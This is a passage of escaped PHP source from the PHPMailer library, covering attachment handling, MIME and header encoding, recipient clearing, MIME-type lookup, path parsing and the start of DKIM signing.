{\r\n        try {\r\n            if (!static::isPermittedPath(\$path) || !@is_file(\$path)) {\r\n                throw new Exception(\$this->lang('file_access') . \$path, self::STOP_CONTINUE);\r\n            }\r\n            if ('' == \$type) {\r\n                \$type = static::filenameToType(\$path);\r\n            }\r\n            \$filename = static::mb_pathinfo(\$path, PATHINFO_BASENAME);\r\n            if ('' == \$name) {\r\n                \$name = \$filename;\r\n            }\r\n            if (!\$this->validateEncoding(\$encoding)) {\r\n                throw new Exception(\$this->lang('encoding') . \$encoding);\r\n            }\r\n            \$this->attachment[] = [0 => \$path, 1 => \$filename, 2 => \$name, 3 => \$encoding, 4 => \$type, 5 => false, 6 => \$disposition, 7 => \$name,];\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            \$this->edebug(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n    public function getAttachments()\r\n    {\r\n        return \$this->attachment;\r\n    }\r\n    protected function attachAll(\$disposition_type, \$boundary)\r\n    {\r\n        \$mime = [];\r\n        \$cidUniq = [];\r\n        \$incl = [];\r\n        foreach (\$this->attachment as \$attachment) {\r\n            if (\$attachment[6] == \$disposition_type) {\r\n                \$string = '';\r\n                \$path = '';\r\n                \$bString = \$attachment[5];\r\n                if (\$bString) {\r\n                    \$string = \$attachment[0];\r\n                } else {\r\n                    \$path = \$attachment[0];\r\n                }\r\n                \$inclhash = hash('sha256', serialize(\$attachment));\r\n                if (in_array(\$inclhash, \$incl)) {\r\n                    continue;\r\n                }\r\n                \$incl[] = \$inclhash;\r\n                \$name = \$attachment[2];\r\n                \$encoding = \$attachment[3];\r\n                \$type = \$attachment[4];\r\n                \$disposition = \$attachment[6];\r\n                \$cid = \$attachment[7];\r\n                if ('inline' == \$disposition and array_key_exists(\$cid, \$cidUniq)) {\r\n                    continue;\r\n                }\r\n                \$cidUniq[\$cid] = true;\r\n                \$mime[] = sprintf('--%s%s', \$boundary, static::\$LE);\r\n                if (!empty(\$name)) {\r\n                    \$mime[] = sprintf('Content-Type: %s; name=\"%s\"%s', \$type, \$this->encodeHeader(\$this->secureHeader(\$name)), static::\$LE);\r\n                } else {\r\n                    \$mime[] = sprintf('Content-Type: %s%s', \$type, static::\$LE);\r\n                }\r\n                if (static::ENCODING_7BIT != \$encoding) {\r\n                    \$mime[] = sprintf('Content-Transfer-Encoding: %s%s', \$encoding, static::\$LE);\r\n                }\r\n                if (!empty(\$cid)) {\r\n                    \$mime[] = sprintf('Content-ID: <%s>%s', \$this->encodeHeader(\$this->secureHeader(\$cid)), static::\$LE);\r\n                }\r\n                if (!empty(\$disposition)) {\r\n                    \$encoded_name = \$this->encodeHeader(\$this->secureHeader(\$name));\r\n                    if (preg_match('/[ \\(\\)<>@,;:\\\\\"\\/\\[\\]\\?=]/', \$encoded_name)) {\r\n                        \$mime[] = sprintf('Content-Disposition: %s; filename=\"%s\"%s', \$disposition, \$encoded_name, static::\$LE . static::\$LE);\r\n                    } else {\r\n                        if (!empty(\$encoded_name)) {\r\n                            \$mime[] = sprintf('Content-Disposition: %s; filename=%s%s', \$disposition, \$encoded_name, static::\$LE . static::\$LE);\r\n                        } else {\r\n                            \$mime[] = sprintf('Content-Disposition: %s%s', \$disposition, static::\$LE . static::\$LE);\r\n                        }\r\n                    }\r\n                } else {\r\n                    \$mime[] = static::\$LE;\r\n                }\r\n                if (\$bString) {\r\n                    \$mime[] = \$this->encodeString(\$string, \$encoding);\r\n                } else {\r\n                    \$mime[] = \$this->encodeFile(\$path, \$encoding);\r\n                }\r\n                if (\$this->isError()) {\r\n                    return '';\r\n                }\r\n                \$mime[] = static::\$LE;\r\n            }\r\n        }\r\n        \$mime[] = sprintf('--%s--%s', \$boundary, static::\$LE);\r\n        return implode('', \$mime);\r\n    }\r\n    protected function encodeFile(\$path, \$encoding = self::ENCODING_BASE64)\r\n    {\r\n        try {\r\n            if (!static::isPermittedPath(\$path) || !file_exists(\$path)) {\r\n                throw new Exception(\$this->lang('file_open') . \$path, self::STOP_CONTINUE);\r\n            }\r\n            \$file_buffer = file_get_contents(\$path);\r\n            if (false === \$file_buffer) {\r\n                throw new Exception(\$this->lang('file_open') . \$path, self::STOP_CONTINUE);\r\n            }\r\n            \$file_buffer = \$this->encodeString(\$file_buffer, \$encoding);\r\n            return \$file_buffer;\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            return '';\r\n        }\r\n    }\r\n    public function encodeString(\$str, \$encoding = self::ENCODING_BASE64)\r\n    {\r\n        \$encoded = '';\r\n        switch (strtolower(\$encoding)) {\r\n            case static::ENCODING_BASE64:\r\n                \$encoded = chunk_split(base64_encode(\$str), static::STD_LINE_LENGTH, static::\$LE);\r\n                break;\r\n            case static::ENCODING_7BIT:\r\n            case static::ENCODING_8BIT:\r\n                \$encoded = static::normalizeBreaks(\$str);\r\n                if (substr(\$encoded, - (strlen(static::\$LE))) != static::\$LE) {\r\n                    \$encoded .= static::\$LE;\r\n                }\r\n                break;\r\n            case static::ENCODING_BINARY:\r\n                \$encoded = \$str;\r\n                break;\r\n            case static::ENCODING_QUOTED_PRINTABLE:\r\n                \$encoded = \$this->encodeQP(\$str);\r\n                break;\r\n            default:\r\n                \$this->setError(\$this->lang('encoding') . \$encoding);\r\n                if (\$this->exceptions) {\r\n                    throw new Exception(\$this->lang('encoding') . \$encoding);\r\n                }\r\n                break;\r\n        }\r\n        return \$encoded;\r\n    }\r\n    public function encodeHeader(\$str, \$position = 'text')\r\n    {\r\n        \$matchcount = 0;\r\n        switch (strtolower(\$position)) {\r\n            case 'phrase':\r\n                if (!preg_match('/[\\200-\\377]/', \$str)) {\r\n                    \$encoded = addcslashes(\$str, \"\\0..\\37\\177\\\\\\\"\");\r\n                    if ((\$str == \$encoded) and !preg_match('/[^A-Za-z0-9!#\$%&\\'*+\\/=?^_`{|}~ -]/', \$str)) {\r\n                        return \$encoded;\r\n                    }\r\n                    return \"\\\"\$encoded\\\"\";\r\n                }\r\n                \$matchcount = preg_match_all('/[^\\040\\041\\043-\\133\\135-\\176]/', \$str, \$matches);\r\n                break;\r\n            case 'comment':\r\n                \$matchcount = preg_match_all('/[()\"]/', \$str, \$matches);\r\n            case 'text':\r\n            default:\r\n                \$matchcount += preg_match_all('/[\\000-\\010\\013\\014\\016-\\037\\177-\\377]/', \$str, \$matches);\r\n                break;\r\n        }\r\n        \$lengthsub = 'mail' == \$this->Mailer ? 13 : 0;\r\n        \$maxlen = static::STD_LINE_LENGTH - \$lengthsub;\r\n        if (\$matchcount > strlen(\$str) / 3) {\r\n            \$encoding = 'B';\r\n            \$maxlen = static::STD_LINE_LENGTH - \$lengthsub - 8 - strlen(\$this->CharSet);\r\n            if (\$this->hasMultiBytes(\$str)) {\r\n                \$encoded = \$this->base64EncodeWrapMB(\$str, \"\\n\");\r\n            } else {\r\n                \$encoded = base64_encode(\$str);\r\n                \$maxlen -= \$maxlen % 4;\r\n                \$encoded = trim(chunk_split(\$encoded, \$maxlen, \"\\n\"));\r\n            }\r\n            \$encoded = preg_replace('/^(.*)\$/m', ' =?' . \$this->CharSet . \"?\$encoding?\\\\1?=\", \$encoded);\r\n        } elseif (\$matchcount > 0) {\r\n            \$encoding = 'Q';\r\n            \$maxlen = static::STD_LINE_LENGTH - \$lengthsub - 8 - strlen(\$this->CharSet);\r\n            \$encoded = \$this->encodeQ(\$str, \$position);\r\n            \$encoded = \$this->wrapText(\$encoded, \$maxlen, true);\r\n            \$encoded = str_replace('=' . static::\$LE, \"\\n\", trim(\$encoded));\r\n            \$encoded = preg_replace('/^(.*)\$/m', ' =?' . \$this->CharSet . \"?\$encoding?\\\\1?=\", \$encoded);\r\n        } elseif (strlen(\$str) > \$maxlen) {\r\n            \$encoded = trim(\$this->wrapText(\$str, \$maxlen, false));\r\n            if (\$str == \$encoded) {\r\n                \$encoded = trim(chunk_split(\$str, static::STD_LINE_LENGTH, static::\$LE));\r\n            }\r\n            \$encoded = str_replace(static::\$LE, \"\\n\", trim(\$encoded));\r\n            \$encoded = preg_replace('/^(.*)\$/m', ' \\\\1', \$encoded);\r\n        } else {\r\n            return \$str;\r\n        }\r\n        return trim(static::normalizeBreaks(\$encoded));\r\n    }\r\n    public function hasMultiBytes(\$str)\r\n    {\r\n        if (function_exists('mb_strlen')) {\r\n            return strlen(\$str) > mb_strlen(\$str, \$this->CharSet);\r\n        }\r\n        return false;\r\n    }\r\n    public function has8bitChars(\$text)\r\n    {\r\n        return (bool)preg_match('/[\\x80-\\xFF]/', \$text);\r\n    }\r\n    public function base64EncodeWrapMB(\$str, \$linebreak = null)\r\n    {\r\n        \$start = '=?' . \$this->CharSet . '?B?';\r\n        \$end = '?=';\r\n        \$encoded = '';\r\n        if (null === \$linebreak) {\r\n            \$linebreak = static::\$LE;\r\n        }\r\n        \$mb_length = mb_strlen(\$str, \$this->CharSet);\r\n        \$length = 75 - strlen(\$start) - strlen(\$end);\r\n        \$ratio = \$mb_length / strlen(\$str);\r\n        \$avgLength = floor(\$length * \$ratio * .75);\r\n        for (\$i = 0; \$i < \$mb_length; \$i += \$offset) {\r\n            \$lookBack = 0;\r\n            do {\r\n                \$offset = \$avgLength - \$lookBack;\r\n                \$chunk = mb_substr(\$str, \$i, \$offset, \$this->CharSet);\r\n                \$chunk = base64_encode(\$chunk);\r\n                ++\$lookBack;\r\n            } while (strlen(\$chunk) > \$length);\r\n            \$encoded .= \$chunk . \$linebreak;\r\n        }\r\n        return substr(\$encoded, 0, -strlen(\$linebreak));\r\n    }\r\n    public function encodeQP(\$string)\r\n    {\r\n        return static::normalizeBreaks(quoted_printable_encode(\$string));\r\n    }\r\n    public function encodeQ(\$str, \$position = 'text')\r\n    {\r\n        \$pattern = '';\r\n        \$encoded = str_replace([\"\\r\", \"\\n\"], '', \$str);\r\n        switch (strtolower(\$position)) {\r\n            case 'phrase':\r\n                \$pattern = '^A-Za-z0-9!*+\\/ -';\r\n                break;\r\n            case 'comment':\r\n                \$pattern = '\\(\\)\"';\r\n            case 'text':\r\n            default:\r\n                \$pattern = '\\000-\\011\\013\\014\\016-\\037\\075\\077\\137\\177-\\377' . \$pattern;\r\n                break;\r\n        }\r\n        \$matches = [];\r\n        if (preg_match_all(\"/[{\$pattern}]/\", \$encoded, \$matches)) {\r\n            \$eqkey = array_search('=', \$matches[0]);\r\n            if (false !== \$eqkey) {\r\n                unset(\$matches[0][\$eqkey]);\r\n                array_unshift(\$matches[0], '=');\r\n            }\r\n            foreach (array_unique(\$matches[0]) as \$char) {\r\n                \$encoded = str_replace(\$char, '=' . sprintf('%02X', ord(\$char)), \$encoded);\r\n            }\r\n        }\r\n        return str_replace(' ', '_', \$encoded);\r\n    }\r\n    public function addStringAttachment(\$string, \$filename, \$encoding = self::ENCODING_BASE64, \$type = '', \$disposition = 'attachment')\r\n    {\r\n        try {\r\n            if ('' == \$type) {\r\n                \$type = static::filenameToType(\$filename);\r\n            }\r\n            if (!\$this->validateEncoding(\$encoding)) {\r\n                throw new Exception(\$this->lang('encoding') . \$encoding);\r\n            }\r\n            \$this->attachment[] = [0 => \$string, 1 => \$filename, 2 => static::mb_pathinfo(\$filename, PATHINFO_BASENAME), 3 => \$encoding, 4 => \$type, 5 => true, 6 => \$disposition, 7 => 0,];\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            \$this->edebug(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n    public function addEmbeddedImage(\$path, \$cid, \$name = '', \$encoding = self::ENCODING_BASE64, \$type = '', \$disposition = 'inline')\r\n    {\r\n        try {\r\n            if (!static::isPermittedPath(\$path) || !@is_file(\$path)) {\r\n                throw new Exception(\$this->lang('file_access') . \$path, self::STOP_CONTINUE);\r\n            }\r\n            if ('' == \$type) {\r\n                \$type = static::filenameToType(\$path);\r\n            }\r\n            if (!\$this->validateEncoding(\$encoding)) {\r\n                throw new Exception(\$this->lang('encoding') . \$encoding);\r\n            }\r\n            \$filename = static::mb_pathinfo(\$path, PATHINFO_BASENAME);\r\n            if ('' == \$name) {\r\n                \$name = \$filename;\r\n            }\r\n            \$this->attachment[] = [0 => \$path, 1 => \$filename, 2 => \$name, 3 => \$encoding, 4 => \$type, 5 => false, 6 => \$disposition, 7 => \$cid,];\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            \$this->edebug(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n    public function addStringEmbeddedImage(\$string, \$cid, \$name = '', \$encoding = self::ENCODING_BASE64, \$type = '', \$disposition = 'inline')\r\n    {\r\n        try {\r\n            if ('' == \$type and !empty(\$name)) {\r\n                \$type = static::filenameToType(\$name);\r\n            }\r\n            if (!\$this->validateEncoding(\$encoding)) {\r\n                throw new Exception(\$this->lang('encoding') . \$encoding);\r\n            }\r\n            \$this->attachment[] = [0 => \$string, 1 => \$name, 2 => \$name, 3 => \$encoding, 4 => \$type, 5 => true, 6 => \$disposition, 7 => \$cid,];\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            \$this->edebug(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n    protected function validateEncoding(\$encoding)\r\n    {\r\n        return in_array(\$encoding, [self::ENCODING_7BIT, self::ENCODING_QUOTED_PRINTABLE, self::ENCODING_BASE64, self::ENCODING_8BIT, self::ENCODING_BINARY,], true);\r\n    }\r\n    protected function cidExists(\$cid)\r\n    {\r\n        foreach (\$this->attachment as \$attachment) {\r\n            if ('inline' == \$attachment[6] and \$cid == \$attachment[7]) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    public function inlineImageExists()\r\n    {\r\n        foreach (\$this->attachment as \$attachment) {\r\n            if ('inline' == \$attachment[6]) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    public function attachmentExists()\r\n    {\r\n        foreach (\$this->attachment as \$attachment) {\r\n            if ('attachment' == \$attachment[6]) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    public function alternativeExists()\r\n    {\r\n        return !empty(\$this->AltBody);\r\n    }\r\n    public function clearQueuedAddresses(\$kind)\r\n    {\r\n        \$this->RecipientsQueue = array_filter(\$this->RecipientsQueue, function (\$params) use (\$kind) {\r\n            return \$params[0] != \$kind;\r\n        });\r\n    }\r\n    public function clearAddresses()\r\n    {\r\n        foreach (\$this->to as \$to) {\r\n            unset(\$this->all_recipients[strtolower(\$to[0])]);\r\n        }\r\n        \$this->to = [];\r\n        \$this->clearQueuedAddresses('to');\r\n    }\r\n    public function clearCCs()\r\n    {\r\n        foreach (\$this->cc as \$cc) {\r\n            unset(\$this->all_recipients[strtolower(\$cc[0])]);\r\n        }\r\n        \$this->cc = [];\r\n        \$this->clearQueuedAddresses('cc');\r\n    }\r\n    public function clearBCCs()\r\n    {\r\n        foreach (\$this->bcc as \$bcc) {\r\n            unset(\$this->all_recipients[strtolower(\$bcc[0])]);\r\n        }\r\n        \$this->bcc = [];\r\n        \$this->clearQueuedAddresses('bcc');\r\n    }\r\n    public function clearReplyTos()\r\n    {\r\n        \$this->ReplyTo = [];\r\n        \$this->ReplyToQueue = [];\r\n    }\r\n    public function clearAllRecipients()\r\n    {\r\n        \$this->to = [];\r\n        \$this->cc = [];\r\n        \$this->bcc = [];\r\n        \$this->all_recipients = [];\r\n        \$this->RecipientsQueue = [];\r\n    }\r\n    public function clearAttachments()\r\n    {\r\n        \$this->attachment = [];\r\n    }\r\n    public function clearCustomHeaders()\r\n    {\r\n        \$this->CustomHeader = [];\r\n    }\r\n    protected function setError(\$msg)\r\n    {\r\n        ++\$this->error_count;\r\n        if ('smtp' == \$this->Mailer and null !== \$this->smtp) {\r\n            \$lasterror = \$this\r\n                ->smtp\r\n                ->getError();\r\n            if (!empty(\$lasterror['error'])) {\r\n                \$msg .= \$this->lang('smtp_error') . \$lasterror['error'];\r\n                if (!empty(\$lasterror['detail'])) {\r\n                    \$msg .= ' Detail: ' . \$lasterror['detail'];\r\n                }\r\n                if (!empty(\$lasterror['smtp_code'])) {\r\n                    \$msg .= ' SMTP code: ' . \$lasterror['smtp_code'];\r\n                }\r\n                if (!empty(\$lasterror['smtp_code_ex'])) {\r\n                    \$msg .= ' Additional SMTP info: ' . \$lasterror['smtp_code_ex'];\r\n                }\r\n            }\r\n        }\r\n        \$this->ErrorInfo = \$msg;\r\n    }\r\n    public static function rfcDate()\r\n    {\r\n        date_default_timezone_set(@date_default_timezone_get());\r\n        return date('D, j M Y H:i:s O');\r\n    }\r\n    protected function serverHostname()\r\n    {\r\n        \$result = '';\r\n        if (!empty(\$this->Hostname)) {\r\n            \$result = \$this->Hostname;\r\n        } elseif (isset(\$_SERVER) and array_key_exists('SERVER_NAME', \$_SERVER)) {\r\n            \$result = \$_SERVER['SERVER_NAME'];\r\n        } elseif (function_exists('gethostname') and gethostname() !== false) {\r\n            \$result = gethostname();\r\n        } elseif (php_uname('n') !== false) {\r\n            \$result = php_uname('n');\r\n        }\r\n        if (!static::isValidHost(\$result)) {\r\n            return 'localhost.localdomain';\r\n        }\r\n        return \$result;\r\n    }\r\n    public static function isValidHost(\$host)\r\n    {\r\n        if (empty(\$host) or !is_string(\$host) or strlen(\$host) > 256) {\r\n            return false;\r\n        }\r\n        if (trim(\$host, '[]') != \$host) {\r\n            return (bool)filter_var(trim(\$host, '[]'), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);\r\n        }\r\n        if (is_numeric(str_replace('.', '', \$host))) {\r\n            return (bool)filter_var(\$host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);\r\n        }\r\n        if (filter_var('http://' . \$host, FILTER_VALIDATE_URL)) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n    protected function lang(\$key)\r\n    {\r\n        if (count(\$this->language) < 1) {\r\n            \$this->setLanguage('en');\r\n        }\r\n        if (array_key_exists(\$key, \$this->language)) {\r\n            if ('smtp_connect_failed' == \$key) {\r\n                return \$this->language[\$key] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';\r\n            }\r\n            return \$this->language[\$key];\r\n        }\r\n        return \$key;\r\n    }\r\n    public function isError()\r\n    {\r\n        return \$this->error_count > 0;\r\n    }\r\n    public function addCustomHeader(\$name, \$value = null)\r\n    {\r\n        if (null === \$value) {\r\n            \$this->CustomHeader[] = explode(':', \$name, 2);\r\n        } else {\r\n            \$this->CustomHeader[] = [\$name, \$value];\r\n        }\r\n    }\r\n    public function getCustomHeaders()\r\n    {\r\n        return \$this->CustomHeader;\r\n    }\r\n    public function msgHTML(\$message, \$basedir = '', \$advanced = false)\r\n    {\r\n        preg_match_all('/(src|background)=[\"\\'](.*)[\"\\']/Ui', \$message, \$images);\r\n        if (array_key_exists(2, \$images)) {\r\n            if (strlen(\$basedir) > 1 && '/' != substr(\$basedir, -1)) {\r\n                \$basedir .= '/';\r\n            }\r\n            foreach (\$images[2] as \$imgindex => \$url) {\r\n                if (preg_match('#^data:(image/(?:jpe?g|gif|png));?(base64)?,(.+)#', \$url, \$match)) {\r\n                    if (count(\$match) == 4 and static::ENCODING_BASE64 == \$match[2]) {\r\n                        \$data = base64_decode(\$match[3]);\r\n                    } elseif ('' == \$match[2]) {\r\n                        \$data = rawurldecode(\$match[3]);\r\n                    } else {\r\n                        continue;\r\n                    }\r\n                    \$cid = hash('sha256', \$data) . '@phpmailer.0';\r\n                    if (!\$this->cidExists(\$cid)) {\r\n                        \$this->addStringEmbeddedImage(\$data, \$cid, 'embed' . \$imgindex, static::ENCODING_BASE64, \$match[1]);\r\n                    }\r\n                    \$message = str_replace(\$images[0][\$imgindex], \$images[1][\$imgindex] . '=\"cid:' . \$cid . '\"', \$message);\r\n                    continue;\r\n                }\r\n                if (!empty(\$basedir) and (strpos(\$url, '..') === false) and 0 !== strpos(\$url, 'cid:') and !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', \$url)) {\r\n                    \$filename = static::mb_pathinfo(\$url, PATHINFO_BASENAME);\r\n                    \$directory = dirname(\$url);\r\n                    if ('.' == \$directory) {\r\n                        \$directory = '';\r\n                    }\r\n                    \$cid = hash('sha256', \$url) . '@phpmailer.0';\r\n                    if (strlen(\$basedir) > 1 and '/' != substr(\$basedir, -1)) {\r\n                        \$basedir .= '/';\r\n                    }\r\n                    if (strlen(\$directory) > 1 and '/' != substr(\$directory, -1)) {\r\n                        \$directory .= '/';\r\n                    }\r\n                    if (\$this->addEmbeddedImage(\$basedir . \$directory . \$filename, \$cid, \$filename, static::ENCODING_BASE64, static::_mime_types((string)static::mb_pathinfo(\$filename, PATHINFO_EXTENSION)))) {\r\n                        \$message = preg_replace('/' . \$images[1][\$imgindex] . '=[\"\\']' . preg_quote(\$url, '/') . '[\"\\']/Ui', \$images[1][\$imgindex] . '=\"cid:' . \$cid . '\"', \$message);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        \$this->isHTML(true);\r\n        \$this->Body = static::normalizeBreaks(\$message);\r\n        \$this->AltBody = static::normalizeBreaks(\$this->html2text(\$message, \$advanced));\r\n        if (!\$this->alternativeExists()) {\r\n            \$this->AltBody = 'This is an HTML-only message. To view it, activate HTML in your email application.' . static::\$LE;\r\n        }\r\n        return \$this->Body;\r\n    }\r\n    public function html2text(\$html, \$advanced = false)\r\n    {\r\n        if (is_callable(\$advanced)) {\r\n            return call_user_func(\$advanced, \$html);\r\n        }\r\n        return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\\/\\\\1>/si', '', \$html))), ENT_QUOTES, \$this->CharSet);\r\n    }\r\n    public static function _mime_types(\$ext = '')\r\n    {\r\n        \$mimes = ['xl' => 'application/excel', 'js' => 'application/javascript', 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'bin' => 'application/macbinary', 'doc' => 'application/msword', 'word' => 'application/msword', 'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'xltx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template', 'potx' => 'application/vnd.openxmlformats-officedocument.presentationml.template', 'ppsx' => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'sldx' => 'application/vnd.openxmlformats-officedocument.presentationml.slide', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'dotx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template', 'xlam' => 'application/vnd.ms-excel.addin.macroEnabled.12', 'xlsb' => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12', 'class' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'dms' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'so' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php3' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xht' => 'application/xhtml+xml', 'xhtml' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'm4a' => 'audio/mp4', 'mpga' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'wav' => 'audio/x-wav', 'mka' => 'audio/x-matroska', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'jpg' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'webp' => 'image/webp', 'heif' => 'image/heif', 'heifs' => 'image/heif-sequence', 'heic' => 'image/heic', 'heics' => 'image/heic-sequence', 'eml' => 'message/rfc822', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'log' => 'text/plain', 'text' => 'text/plain', 'txt' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'vcf' => 'text/vcard', 'vcard' => 'text/vcard', 'ics' => 'text/calendar', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'wmv' => 'video/x-ms-wmv', 'mpeg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mp4' => 'video/mp4', 'm4v' => 'video/mp4', 'mov' => 'video/quicktime', 'qt' => 'video/quicktime', 'rv' => 'video/vnd.rn-realvideo', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie', 'webm' => 'video/webm', 'mkv' => 'video/x-matroska',];\r\n        \$ext = strtolower(\$ext);\r\n        if (array_key_exists(\$ext, \$mimes)) {\r\n            return \$mimes[\$ext];\r\n        }\r\n        return 'application/octet-stream';\r\n    }\r\n    public static function filenameToType(\$filename)\r\n    {\r\n        \$qpos = strpos(\$filename, '?');\r\n        if (false !== \$qpos) {\r\n            \$filename = substr(\$filename, 0, \$qpos);\r\n        }\r\n        \$ext = static::mb_pathinfo(\$filename, PATHINFO_EXTENSION);\r\n        return static::_mime_types(\$ext);\r\n    }\r\n    public static function mb_pathinfo(\$path, \$options = null)\r\n    {\r\n        \$ret = ['dirname' => '', 'basename' => '', 'extension' => '', 'filename' => ''];\r\n        \$pathinfo = [];\r\n        if (preg_match('#^(.*?)[\\\\\\\\/]*(([^/\\\\\\\\]*?)(\\.([^.\\\\\\\\/]+?)|))[\\\\\\\\/.]*\$#m', \$path, \$pathinfo)) {\r\n            if (array_key_exists(1, \$pathinfo)) {\r\n                \$ret['dirname'] = \$pathinfo[1];\r\n            }\r\n            if (array_key_exists(2, \$pathinfo)) {\r\n                \$ret['basename'] = \$pathinfo[2];\r\n            }\r\n            if (array_key_exists(5, \$pathinfo)) {\r\n                \$ret['extension'] = \$pathinfo[5];\r\n            }\r\n            if (array_key_exists(3, \$pathinfo)) {\r\n                \$ret['filename'] = \$pathinfo[3];\r\n            }\r\n        }\r\n        switch (\$options) {\r\n            case PATHINFO_DIRNAME:\r\n            case 'dirname':\r\n                return \$ret['dirname'];\r\n            case PATHINFO_BASENAME:\r\n            case 'basename':\r\n                return \$ret['basename'];\r\n            case PATHINFO_EXTENSION:\r\n            case 'extension':\r\n                return \$ret['extension'];\r\n            case PATHINFO_FILENAME:\r\n            case 'filename':\r\n                return \$ret['filename'];\r\n            default:\r\n                return \$ret;\r\n        }\r\n    }\r\n    public function set(\$name, \$value = '')\r\n    {\r\n        if (property_exists(\$this, \$name)) {\r\n            \$this->\$name = \$value;\r\n            return true;\r\n        }\r\n        \$this->setError(\$this->lang('variable_set') . \$name);\r\n        return false;\r\n    }\r\n    public function secureHeader(\$str)\r\n    {\r\n        return trim(str_replace([\"\\r\", \"\\n\"], '', \$str));\r\n    }\r\n    public static function normalizeBreaks(\$text, \$breaktype = null)\r\n    {\r\n        if (null === \$breaktype) {\r\n            \$breaktype = static::\$LE;\r\n        }\r\n        \$text = str_replace([\"\\r\\n\", \"\\r\"], \"\\n\", \$text);\r\n        if (\"\\n\" !== \$breaktype) {\r\n            \$text = str_replace(\"\\n\", \$breaktype, \$text);\r\n        }\r\n        return \$text;\r\n    }\r\n    public static function getLE()\r\n    {\r\n        return static::\$LE;\r\n    }\r\n    protected static function setLE(\$le)\r\n    {\r\n        static::\$LE = \$le;\r\n    }\r\n    public function sign(\$cert_filename, \$key_filename, \$key_pass, \$extracerts_filename = '')\r\n    {\r\n        \$this->sign_cert_file = \$cert_filename;\r\n        \$this->sign_key_file = \$key_filename;\r\n        \$this->sign_key_pass = \$key_pass;\r\n        \$this->sign_extracerts_file = \$extracerts_filename;\r\n    }\r\n    public function DKIM_QP(\$txt)\r\n    {\r\n        \$line = '';\r\n        \$len = strlen(\$txt);\r\n        for (\$i = 0; \$i < \$len; ++\$i) {\r\n            \$ord = ord(\$txt[\$i]);\r\n            if (((0x21 <= \$ord) and (\$ord <= 0x3A)) or \$ord == 0x3C or ((0x3E <= \$ord) and (\$ord <= 0x7E))) {\r\n                \$line .= \$txt[\$i];\r\n            } else {\r\n                \$line .= '=' . sprintf('%02X', \$ord);\r\n            }\r\n        }\r\n        return \$line;\r\n    }\r\n    public function DKIM_Sign(\$signHeader)\r\n    {\r\n        if (!defined('PKCS7_TEXT')) {\r\n            if (\$this->exceptions) {\r\n                throw new Exception(\$this->lang('extension_missing') . 